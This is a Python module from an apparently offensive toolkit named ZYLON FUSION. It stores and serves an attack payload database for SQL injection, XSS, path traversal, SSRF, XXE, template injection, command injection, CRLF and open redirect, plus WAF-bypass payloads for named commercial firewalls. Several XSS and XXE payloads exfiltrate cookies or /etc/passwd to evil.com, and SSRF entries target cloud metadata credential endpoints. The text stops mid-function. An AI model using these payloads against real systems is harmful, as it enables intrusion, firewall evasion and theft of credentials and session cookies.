#!/usr/bin/env python3
"""
ZYLON FUSION v5.0.0 - Payload Database Engine
===============================================
Fused from: PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings)
           + GF / Gf-Patterns (https://github.com/tomnomnom/gf)
           + Custom Zylon Techniques
Capabilities:
  - Comprehensive payload database for ALL attack types
  - SQLi payloads (error-based, blind, UNION, time-based, WAF bypass)
  - XSS payloads (reflected, stored, DOM, blind, WAF bypass)
  - LFI/RFI payloads (traversal, wrappers, encoding bypass)
  - SSRF payloads (cloud metadata, internal scanning, protocol smuggling)
  - XXE payloads (in-band, OOB, blind, parameterized)
  - SSTI payloads (all template engines)
  - Command injection payloads (Linux, Windows, filter bypass)
  - CRLF injection payloads
  - Open redirect payloads
  - CSRF payloads
  - Pattern-based URL categorization (like GF)
  - Payload search by type, context, or WAF
  - Custom payload import
Termux Compatible | No Root Required | Python 3.13+
"""

import os
import sys
import re
import json
import time
import threading
import hashlib
import random
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote, parse_qs

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.var import (
    USER_AGENTS, DEFAULT_TIMEOUT, MAX_THREADS, DATA_DIR
)

# ============================================================================
# ANSI COLOR CODES (Termux-compatible)
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# ============================================================================
# PAYLOAD DATABASE
# ============================================================================

PAYLOAD_DB = {
    "sqli": {
        "error_based": [
            "'", "''", "' OR '1'='1", "' OR 1=1--", "' OR '1'='1'--",
            "\" OR \"1\"=\"1", "' OR '1'='1' ({", "' OR '1'='1' /*",
            "1' ORDER BY 1--", "1' ORDER BY 100--",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "admin'--", "1' AND 1=1--", "1' AND 1=2--",
            "' AND 1=1--", "' AND 1=2--",
        ],
        "blind": [
            "' AND 1=1--", "' AND 1=2--",
            "' AND SLEEP(5)--", "' AND BENCHMARK(5000000,SHA1('test'))--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND IF(1=1,SLEEP(5),0)--",
            "' AND 1=1 #", "' AND 1=2 #",
            "1 AND 1=1", "1 AND 1=2",
        ],
        "union": [
            "' UNION SELECT 1--", "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT NULL,username,password FROM users--",
            "' UNION ALL SELECT NULL,username,password FROM users--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            "' UNION SELECT schema_name FROM information_schema.schemata--",
        ],
        "time_based": [
            "' AND SLEEP(5)--", "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND IF(1=1,SLEEP(5),0)--",
            "1' AND IF(1=1,BENCHMARK(5000000,SHA1('test')),0)--",
            "' OR IF(1=1,SLEEP(5),0)--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "' AND pg_sleep(5)--",
            "1 AND (SELECT pg_sleep(5))--",
        ],
        "waf_bypass": [
            "'/**/OR/**/1=1--", "'/*!OR*/1=1--",
            "'%20OR%201=1--", "' OR%0A1=1--",
            "' OORR 1=1--", "' O%52R 1=1--",
            "' oR 1=1--", "' Or 1=1--",
            "' /*!50000OR*/1=1--", "' OR+1=1--",
            "'%27%20OR%201=1--", "'||1=1--",
            "' OR 1=1 LIMIT 1 OFFSET 0--",
            "' UN/**/ION SE/**/LECT NULL--",
            "1'/**/AND/**/1=1--",
            "' /*!UNION*//*!SELECT*/1,2--",
            "' oRdEr By 1--", "' UnIoN SeLeCt 1,2--",
        ],
    },
    "xss": {
        "reflected": [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            '<input onfocus=alert(1) autofocus>',
            '"><iframe src="javascript:alert(1)">',
            "<details open ontoggle=alert(1)>",
            "javascript:alert(1)",
            '<a href="javascript:alert(1)">click</a>',
            '<marquee onstart=alert(1)>',
            '<div onmouseover=alert(1)>hover</div>',
        ],
        "stored": [
            '<script>document.location="http://evil.com/?c="+document.cookie</script>',
            '<img src=x onerror="fetch(\'http://evil.com/?c=\'+document.cookie)">',
            '<svg/onload=fetch("http://evil.com/?c="+document.cookie)>',
            '<script>new Image().src="http://evil.com/?c="+document.cookie</script>',
            '<input onfocus=fetch("http://evil.com/?c="+document.cookie) autofocus>',
        ],
        "dom": [
            '#<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '#"><script>alert(1)</script>',
            '?default=<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
        ],
        "blind": [
            '<script>fetch("http://evil.com/blind?c="+document.domain)</script>',
            '<img src=x onerror="fetch(\'http://evil.com/blind?d=\'+document.domain)">',
            '<svg onload=fetch("http://evil.com/blind?d="+document.domain)>',
            '<script>new Image().src="http://evil.com/blind?d="+document.domain</script>',
        ],
        "waf_bypass": [
            '<Img sRc=x OnErRoR=alert(1)>',
            '<SVG/oNloAd=alert(1)>',
            '<sCrIpT>alert(1)</ScRiPt>',
            '<img src=x oneonerrorrror=alert(1)>',
            '<img src=x onerror=\x61lert(1)>',
            '<img src=x onerror=&#97;lert(1)>',
            '<img src=x onerror=&#x61;lert(1)>',
            '<img src="x" onerror="alert`1`">',
            '<svg/onload=alert(1)//',
            '<script/xss>alert(1)</script>',
            '"><img/src=x onerror=alert(1)>',
            "'-alert(1)-'",
            '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
            '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
            '<svg><script>alert&#40;1&#41;</script></svg>',
        ],
    },
    "lfi": {
        "traversal": [
            "../../../etc/passwd", "../../../../etc/passwd",
            "../../../../../etc/passwd", "../../../../../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
        ],
        "wrappers": [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7",
            "expect://id",
            "php://filter/read=convert.base64-encode/resource=config.php",
            "phar:///tmp/test.phar",
            "zip://archive.zip#shell.php",
        ],
        "encoding_bypass": [
            "..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%00/..%00/..%00/etc/passwd",
            "....//....//....//etc/passwd",
            "..%5c..%5c..%5cwindows%5cwin.ini",
        ],
        "null_byte": [
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd%00.png",
            "..\\..\\..\\windows\\win.ini%00",
        ],
    },
    "ssrf": {
        "cloud_metadata": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
            "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
            "http://169.254.169.254/opcache/v1/config?",  # DigitalOcean
        ],
        "internal_scanning": [
            "http://127.0.0.1", "http://localhost",
            "http://127.0.0.1:22", "http://127.0.0.1:3306",
            "http://127.0.0.1:6379", "http://127.0.0.1:8080",
            "http://127.0.0.1:9200", "http://127.0.0.1:27017",
            "http://[::1]", "http://[::1]:80",
            "http://0x7f000001", "http://017700000001",
            "http://0177.0.0.1", "http://2130706433",
            "http://127.1", "http://127.0.0.1:443",
        ],
        "protocol_smuggling": [
            "gopher://127.0.0.1:25/_HELO%20localhost",
            "gopher://127.0.0.1:6379/_INFO",
            "dict://127.0.0.1:6379/INFO",
            "file:///etc/passwd",
            "file:///proc/self/environ",
            "ldap://127.0.0.1:389/",
            "ftp://127.0.0.1:21/",
        ],
    },
    "xxe": {
        "in_band": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        ],
        "oob": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd"> %dtd;]>',
        ],
        "blind": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM \'http://evil.com/?d=%file;\'>">%eval;%send;]>',
        ],
        "parameterized": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]>',
        ],
    },
    "ssti": {
        "jinja2": [
            "{{7*7}}", "{{7*'7'}}", "{{config}}", "{{self.__class__.__mro__}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        "twig": [
            "{{7*7}}", "{{7*7|format('d')}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
        ],
        "freemarker": [
            "${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            "#{7*7}",
        ],
        "velocity": [
            "#set($x=7*7)$x", "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
        ],
        "erb": [
            "<%= 7*7 %>", "<%= system('id') %>", "<%= `id` %>",
        ],
        "mako": [
            "${7*7}", "<% import os; x=os.popen('id').read() %>${x}",
        ],
        "jade": [
            "#{7*7}", "-var x = 7*7; =x",
        ],
        "dust": [
            "{7*7}", "{#lte}{/lte}",
        ],
        "handlebars": [
            "{{7*7}}", "{{this}}", "{{constructor}}",
        ],
        "thymeleaf": [
            "[[${7*7}]]", "__${7*7}__", "${T(java.lang.Runtime).getRuntime().exec('id')}",
        ],
        "pebble": [
            "{{7*7}}", "{{ \"id\" | execute }}",
        ],
    },
    "cmd_injection": {
        "linux": [
            "; id", "| id", "|| id", "&& id",
            "`id`", "$(id)", ";id", "|id",
            "& id", "\n id", "`id`",
            "$(sleep 5)", "; sleep 5", "| sleep 5",
            "/bin/id", "id|", "id;",
        ],
        "windows": [
            "& whoami", "| whoami", "&& whoami", "|| whoami",
            "%OS%", "& dir", "| dir",
            "& timeout 5", "| timeout 5",
            "cmd /c whoami", "^| whoami",
        ],
        "filter_bypass": [
            "w'h'o'a'm'i", "w\"h\"o\"a\"m\"i",
            "wh$()oami", "who%00ami",
            "/???/??t /???/p??s??", "/bin/c't'at /etc/passwd",
            "c'a't /etc/passwd", "c\"a\"t /etc/passwd",
            "ca\\t /etc/passwd", "cat$@ /etc/passwd",
            "{cat,/etc/passwd}", "cat</etc/passwd",
            "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
        ],
    },
    "crlf": {
        "basic": [
            "%0d%0aInjected-Header: test",
            "\\r\\nInjected-Header: test",
            "%0dInjected-Header: test",
            "%0aInjected-Header: test",
            "\r\nInjected-Header: test",
        ],
        "advanced": [
            "%0d%0aSet-Cookie: evil=test",
            "%0d%0aLocation: http://evil.com",
            "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK",
            "%0d%0a%0d%0a<script>alert(1)</script>",
        ],
    },
    "open_redirect": {
        "basic": [
            "//evil.com", "//evil.com/", "https://evil.com",
            "https://evil.com%00.target.com",
            "https://evil.com\\@target.com",
            "https://target.com@evil.com",
            "/\\evil.com", "///evil.com",
            "javascript:alert(1)",
        ],
    },
    "csrf": {
        "tokens": [
            "csrf_token=", "xsrf-token=", "_token=",
            "authenticity_token=", "anti_forgery_token=",
            "__RequestVerificationToken=", "csrfmiddlewaretoken=",
        ],
    },
}

# ============================================================================
# GF-STYLE URL CATEGORIZATION PATTERNS
# ============================================================================

GF_PATTERNS = {
    "redirect": [
        r"(url=|redirect=|redir=|redirect_uri=|redirect_url=|return=|returnTo=|return_to=|go=|target=|link=|dest=|destination=|next=|follow=|out=|exit=|navigate=|forward=|forward_url=|continue=|callback=|return_path=)",
    ],
    "sqli": [
        r"(id=|pid=|cat=|category=|item=|page=|news=|post=|article=|story=|file=|doc=|doc_id=|type=|sort=|order=|search=|query=|q=|keyword=|sel=|select=|show=|display=|report=|report_id=|user=|username=|login=|email=|name=|key=|keys=|p=|s=|status=|action=|mode=)",
    ],
    "xss": [
        r"(q=|search=|query=|keyword=|keywords=|name=|sort=|order=|term=|find=|s=|keywords=|search_term=|search_query=|item=|desc=|description=|title=|text=|value=|comment=|message=|content=|msg=|input=|user=|username=|email=|fname=|lname=|param=)",
    ],
    "lfi": [
        r"(file=|path=|dir=|page=|include=|template=|doc=|document=|root=|pg=|style=|pdf=|lang=|load=|read=|open=|view=|content=|img=|image=|src=|source=|folder=|folder_id=|file_name=|filepath=|fp=|file_name=)",
    ],
    "ssrf": [
        r"(url=|uri=|path=|dest=|redirect=|redirect_uri=|redirect_url=|target=|rurl=|src=|source=|domain=|site=|link=|reference=|img=|image=|load=|callback=|feed=|host=|port=|next=|go=|return=|return_url=|api=|proxy=)",
    ],
    "rce": [
        r"(cmd=|exec=|command=|execute=|ping=|query=|jump=|code=|reg=|do=|func=|arg=|option=|load=|process=|step=|action=|run=|shell=|module=|payload=|handler=|type=)",
    ],
    "debug": [
        r"(debug=|test=|dev=|trace=|profiler=|verbose=|log=|logging=|info=|dump=|sql_debug=|show=|admin=|console=|debugger=|mode=|environment=|env=|status=|health=|ping=|version=|build=)",
    ],
    "idor": [
        r"(id=|uid=|user_id=|account=|account_id=|order=|order_id=|doc=|doc_id=|file=|file_id=|message=|message_id=|profile=|profile_id=|item=|item_id=|report=|report_id=|group=|group_id=|team=|team_id=|project=|project_id=|invoice=|invoice_id=|ticket=|ticket_id=)",
    ],
    "interesting": [
        r"(api=|token=|key=|secret=|password=|passwd=|pwd=|hash=|encrypt=|decrypt=|auth=|session=|cookie=|access=|private=|admin=|root=|config=|config_id=|setting=|role=|permission=|privilege=|grant=|scope=|callback=|webhook=|notify=)",
    ],
}

# WAF-specific bypass payloads
WAF_BYPAYLOADS = {
    "cloudflare": {
        "sqli": [
            "'/**/OR/**/1=1--", "'/*!50000OR*/1=1--",
            "' OORR 1=1--", "' OR%0A1=1--",
            "' /*!UNION*//*!SELECT*/1,2--",
        ],
        "xss": [
            '<Img sRc=x OnErRoR=alert(1)>',
            '<SVG/oNloAd=alert(1)//',
            '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
            '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
        ],
        "rce": [
            "w'h'o'a'm'i", "wh$()oami",
            "/???/??t /???/p??s??",
            "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
        ],
    },
    "modsecurity": {
        "sqli": [
            "' OR+1=1--", "'%27%20OR%201=1--",
            "'||1=1--", "' OR 1 LIMIT 1 OFFSET 0--",
        ],
        "xss": [
            '<img src=x onerror=\x61lert(1)>',
            '<img src=x onerror=&#97;lert(1)>',
            '<img src=x onerror=&#x61;lert(1)>',
            '<svg/onload=alert(1)//',
        ],
    },
    "aws_waf": {
        "sqli": [
            "' UnIoN SeLeCt 1,2--", "' oRdEr By 1--",
            "'/**/union/**/select/**/1,2--",
        ],
        "xss": [
            '<img/src=x onerror=alert(1)>',
            '<script/xss>alert(1)</script>',
            '<svg><script>alert&#40;1&#41;</script></svg>',
        ],
    },
    "imperva": {
        "sqli": [
            "' OR%0A1=1--", "'/**/OR/**/1=1--",
        ],
        "xss": [
            '<Img sRc=x OnErRoR=alert`1`>',
            "'-alert(1)-'",
        ],
    },
    "akamai": {
        "sqli": [
            "' OR 1=1 LIMIT 1--", "'||1=1--",
        ],
        "xss": [
            '<img src=x oneonerrorrror=alert(1)>',
            '<img src=x onerror=alert(1)>',
        ],
    },
}


class PayloadDBEngine:
    """Payload Database Engine - Fused from PayloadsAllTheThings + GF + Custom Techniques"""

    def __init__(self, timeout=DEFAULT_TIMEOUT, threads=MAX_THREADS, proxy=None):
        self.timeout = timeout
        self.threads = threads
        self.proxy = proxy
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': USER_AGENTS[0] if USER_AGENTS else 'Mozilla/5.0'
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.lock = threading.Lock()
        self._custom_payloads = {}
        self._load_custom_payloads()

    def _print(self, msg, color=CYAN):
        """Thread-safe colored print"""
        with self.lock:
            print(f"{color}{msg}{RESET}")

    def _load_custom_payloads(self):
        """Load custom payloads from data directory"""
        custom_dir = os.path.join(DATA_DIR, 'custom_payloads')
        if os.path.isdir(custom_dir):
            for fname in os.listdir(custom_dir):
                if fname.endswith('.txt'):
                    category = fname.replace('.txt', '')
                    fpath = os.path.join(custom_dir, fname)
                    try:
                        with open(fpath, 'r', errors='ignore') as f:
                            payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                        if payloads:
                            self._custom_payloads[category] = payloads
                    except Exception:
                        pass

    # ========================================================================
    # GET PAYLOADS BY ATTACK TYPE
    # ========================================================================

    def get_payloads(self, attack_type):
        """Get payloads by attack type

        Args:
            attack_type: Attack type (e.g., 'sqli', 'xss', 'lfi', 'ssrf', 'xxe',
                        'ssti', 'cmd_injection', 'crlf', 'open_redirect', 'csrf')
                        Can also specify subcategory: 'sqli.error_based', 'xss.waf_bypass'

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Payload DB: Get Payloads by Type{RESET}", CYAN)
        self._print(f"  [*] Attack type: {attack_type}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "attack_type": attack_type,
                "categories": [],
                "payload_count": 0,
                "payloads": {},
            },
            "scan_type": "payload_db_browse",
        }

        # Check for subcategory (e.g., 'sqli.error_based')
        if '.' in attack_type:
            main_type, sub_type = attack_type.split('.', 1)
            if main_type in PAYLOAD_DB and sub_type in PAYLOAD_DB[main_type]:
                payloads = PAYLOAD_DB[main_type][sub_type]
                result["details"]["categories"] = [sub_type]
                result["details"]["payloads"][sub_type] = payloads
                result["details"]["payload_count"] = len(payloads)
                result["findings"].append({
                    "type": "payload_category",
                    "description": f"Found {len(payloads)} payloads for {attack_type}",
                    "category": attack_type,
                    "count": len(payloads),
                })
            else:
                result["findings"].append({
                    "type": "error",
                    "description": f"Category not found: {attack_type}",
                })
        else:
            if attack_type in PAYLOAD_DB:
                categories = PAYLOAD_DB[attack_type]
                result["details"]["categories"] = list(categories.keys())
                total = 0
                for cat, payloads in categories.items():
                    result["details"]["payloads"][cat] = payloads
                    total += len(payloads)
                result["details"]["payload_count"] = total
                result["findings"].append({
                    "type": "payload_category",
                    "description": f"Found {total} payloads across {len(categories)} subcategories for '{attack_type}'",
                    "category": attack_type,
                    "count": total,
                    "subcategories": list(categories.keys()),
                })

            # Also check custom payloads
            if attack_type in self._custom_payloads:
                custom = self._custom_payloads[attack_type]
                result["details"]["payloads"]["custom"] = custom
                result["details"]["payload_count"] += len(custom)
                result["findings"].append({
                    "type": "custom_payloads",
                    "description": f"Found {len(custom)} custom payloads for '{attack_type}'",
                    "count": len(custom),
                })

            if attack_type not in PAYLOAD_DB and attack_type not in self._custom_payloads:
                result["findings"].append({
                    "type": "error",
                    "description": f"Unknown attack type: {attack_type}",
                })

        self._print(f"  [+] Total payloads: {result['details']['payload_count']}", GREEN)
        return result

    # ========================================================================
    # SEARCH PAYLOADS
    # ========================================================================

    def search_payloads(self, query):
        """Search payloads by query string

        Args:
            query: Search query string

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Payload DB: Search Payloads{RESET}", CYAN)
        self._print(f"  [*] Query: {query}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "query": query,
                "matches": [],
                "total_matches": 0,
            },
            "scan_type": "payload_search",
        }

        query_lower = query.lower()
        matches = []

        # Search in all categories
        for attack_type, categories in PAYLOAD_DB.items():
            for sub_cat, payloads in categories.items():
                for payload in payloads:
                    if query_lower in payload.lower():
                        matches.append({
                            "attack_type": attack_type,
                            "subcategory": sub_cat,
                            "payload": payload,
                        })

        # Search custom payloads
        for cat, payloads in self._custom_payloads.items():
            for payload in payloads:
                if query_lower in payload.lower():
                    matches.append({
                        "attack_type": "custom",
                        "subcategory": cat,
                        "payload": payload,
                    })

        result["details"]["matches"] = matches
        result["details"]["total_matches"] = len(matches)

        if matches:
            result["findings"].append({
                "type": "search_results",
                "description": f"Found {len(matches)} payloads matching '{query}'",
                "count": len(matches),
            })
        else:
            result["findings"].append({
                "type": "no_results",
                "description": f"No payloads found matching '{query}'",
            })

        self._print(f"  [+] Matches: {len(matches)}", GREEN if matches else YELLOW)
        return result

    # ========================================================================
    # GF-STYLE URL CATEGORIZATION
    # ========================================================================

    def categorize_urls(self, urls, pattern=None):
        """GF-style URL categorization by pattern matching

        Args:
            urls: List of URLs to categorize
            pattern: GF pattern name (e.g., 'redirect', 'sqli', 'xss', 'lfi', 'ssrf')
                    If None, categorize against all patterns

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  GF-Style URL Categorization{RESET}", CYAN)
        self._print(f"  [*] URLs: {len(urls)} | Pattern: {pattern or 'ALL'}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "urls_processed": len(urls),
                "pattern": pattern,
                "categories": {},
                "categorized_urls": {},
            },
            "scan_type": "gf_categorize",
        }

        patterns_to_use = {}
        if pattern and pattern in GF_PATTERNS:
            patterns_to_use[pattern] = GF_PATTERNS[pattern]
        else:
            patterns_to_use = GF_PATTERNS

        for pat_name, regexes in patterns_to_use.items():
            matched_urls = []
            for url in urls:
                for regex in regexes:
                    try:
                        if re.search(regex, url, re.IGNORECASE):
                            matched_urls.append(url)
                            break
                    except re.error:
                        pass

            if matched_urls:
                result["details"]["categories"][pat_name] = len(matched_urls)
                result["details"]["categorized_urls"][pat_name] = matched_urls
                result["findings"].append({
                    "type": "gf_category",
                    "description": f"GF pattern '{pat_name}' matched {len(matched_urls)} URL(s)",
                    "pattern": pat_name,
                    "count": len(matched_urls),
                    "sample_urls": matched_urls[:5],
                })
                self._print(f"  [+] {pat_name}: {len(matched_urls)} URLs matched", GREEN)

        total_categorized = sum(len(v) for v in result["details"]["categorized_urls"].values())
        self._print(f"  [*] Total categorized: {total_categorized}", CYAN)
        return result

    # ========================================================================
    # WAF BYPASS PAYLOADS
    # ========================================================================

    def get_waf_bypass_payloads(self, waf_type):
        """Get WAF-specific bypass payloads

        Args:
            waf_type: WAF type (e.g., 'cloudflare', 'modsecurity', 'aws_waf', 'imperva', 'akamai')

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  WAF Bypass Payloads{RESET}", CYAN)
        self._print(f"  [*] WAF type: {waf_type}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "waf_type": waf_type,
                "bypass_categories": [],
                "payloads": {},
                "total_payloads": 0,
            },
            "scan_type": "waf_bypass_payloads",
        }

        waf_type_lower = waf_type.lower().replace(' ', '_').replace('-', '_')

        if waf_type_lower in WAF_BYPAYLOADS:
            bypass_data = WAF_BYPAYLOADS[waf_type_lower]
            total = 0
            for category, payloads in bypass_data.items():
                result["details"]["payloads"][category] = payloads
                result["details"]["bypass_categories"].append(category)
                total += len(payloads)
                result["findings"].append({
                    "type": "waf_bypass_category",
                    "description": f"Found {len(payloads)} {category} bypass payloads for {waf_type}",
                    "waf": waf_type,
                    "category": category,
                    "count": len(payloads),
                })
            result["details"]["total_payloads"] = total
        else:
            # If WAF not found, return generic WAF bypass payloads
            result["findings"].append({
                "type": "waf_not_found",
                "description": f"WAF type '{waf_type}' not in database. Available: {list(WAF_BYPAYLOADS.keys())}",
            })
            # Return all WAF bypass payloads as fallback
            for waf_name, bypass_data in WAF_BYPAYLOADS.items():
                for category, payloads in bypass_data.items():
                    key = f"{waf_name}_{category}"
                    result["details"]["payloads"][key] = payloads
                    result["details"]["total_payloads"] += len(payloads)

        self._print(f"  [+] Total WAF bypass payloads: {result['details']['total_payloads']}", GREEN)
        return result

    # ========================================================================
    # IMPORT CUSTOM PAYLOADS
    # ========================================================================

    def import_payloads(self, file_path, category):
        """Import custom payloads from file

        Args:
            file_path: Path to file containing payloads (one per line)
            category: Category name for the payloads

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Payload DB: Import Custom Payloads{RESET}", CYAN)
        self._print(f"  [*] File: {file_path} | Category: {category}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "file_path": file_path,
                "category": category,
                "imported": 0,
                "errors": 0,
            },
            "scan_type": "payload_import",
        }

        if not os.path.isfile(file_path):
            result["findings"].append({
                "type": "error",
                "description": f"File not found: {file_path}",
            })
            return result

        try:
            with open(file_path, 'r', errors='ignore') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]

            if not payloads:
                result["findings"].append({
                    "type": "error",
                    "description": "File is empty or contains no valid payloads",
                })
                return result

            # Store in memory
            self._custom_payloads[category] = payloads

            # Save to data directory for persistence
            custom_dir = os.path.join(DATA_DIR, 'custom_payloads')
            os.makedirs(custom_dir, exist_ok=True)
            save_path = os.path.join(custom_dir, f"{category}.txt")
            with open(save_path, 'w') as f:
                for p in payloads:
                    f.write(p + '\n')

            result["details"]["imported"] = len(payloads)
            result["findings"].append({
                "type": "import_success",
                "description": f"Successfully imported {len(payloads)} payloads into category '{category}'",
                "category": category,
                "count": len(payloads),
            })
            self._print(f"  [+] Imported {len(payloads)} payloads into '{category}'", GREEN)

        except Exception as e:
            result["details"]["errors"] += 1
            result["findings"].append({
                "type": "error",
                "description": f"Import failed: {str(e)[:100]}",
            })

        return result

    # ========================================================================
    # LIST CATEGORIES
    # ========================================================================

    def list_categories(self):
        """List all payload categories

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}  Payload DB: List Categories{RESET}", CYAN)

        result = {
            "vulnerable": False,
            "findings": [],
            "details": {
                "categories": {},
                "total_payloads": 0,
                "total_subcategories": 0,
            },
            "scan_type": "payload_list_categories",
        }

        total_payloads = 0
        total_subs = 0

        for attack_type, categories in PAYLOAD_DB.items():
            sub_cats = list(categories.keys())
            count = sum(len(v) for v in categories.values())
            result["details"]["categories"][attack_type] = {
                "subcategories": sub_cats,
                "payload_count": count,
            }
            total_payloads += count
            total_subs += len(sub_cats)

            # Add custom
            if attack_type in self._custom_payloads:
                custom_count = len(self._custom_payloads[attack_type])
                result["details"]["categories"][attack_type]["custom_payloads"] = custom_count
                total_payloads += custom_count

        # Add custom-only categories
        for cat in self._custom_payloads:
            if cat not in PAYLOAD_DB:
                count = len(self._custom_payloads[cat])
                result["details"]["categories"][cat] = {
                    "subcategories": ["custom"],
                    "payload_count": count,
                }
                total_payloads += count

        result["details"]["total_payloads"] = total_payloads
        result["details"]["total_subcategories"] = total_subs
        result["findings"].append({
            "type": "category_list",
            "description": f"Found {len(result['details']['categories'])} main categories, "
                          f"{total_subs} subcategories, {total_payloads} total payloads",
        })

        self._print(f"  [+] {len(result['details']['categories'])} categories, {total_payloads} total payloads", GREEN)
        return result

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target=None, scan_type='list', **kwargs):
        """Main entry point for Payload DB Engine

        Args:
            target: Target URL or file path (for import)
            scan_type: Scan type ('list', 'browse', 'search', 'categorize',
                       'waf_bypass', 'import', 'full_db')
            **kwargs: Additional arguments

        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        if scan_type == 'list':
            return self.list_categories()
        elif scan_type == 'browse':
            attack_type = kwargs.get('attack_type', target or 'sqli')
            return self.get_payloads(attack_type)
        elif scan_type == 'search':
            query = kwargs.get('query', target or '')
            return self.search_payloads(query)
        elif scan_type == 'categorize':
            urls = kwargs.get('urls', [target] if target else [])
            pattern = kwargs.get('pattern', None)
            return self.categorize_urls(urls, pattern)
        elif scan_type == 'waf_bypass':
            waf_type = kwargs.get('waf_type', target or 'cloudflare')
            return self.get_waf_bypass_payloads(waf_type)
        elif scan_type == 'import':
